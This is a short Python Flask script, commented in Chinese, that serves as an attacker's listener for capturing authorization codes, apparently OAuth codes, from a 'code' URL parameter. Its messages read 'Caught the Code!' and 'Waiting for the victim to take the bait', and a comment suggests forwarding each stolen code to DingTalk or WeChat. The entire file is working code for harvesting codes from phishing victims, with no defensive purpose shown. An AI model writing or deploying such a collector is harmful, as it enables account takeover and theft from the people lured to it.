from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def home():
    # 1. 获取 URL 中的 code
    code = request.args.get('code')
    
    # 2. 如果有 code，就打印出来，或者发送到你的钉钉/微信
    if code:
        return f"抓到 Code 了！内容是: {code}"
    else:
        return "等待受害者上钩..."

if __name__ == '__main__':
    app.run()
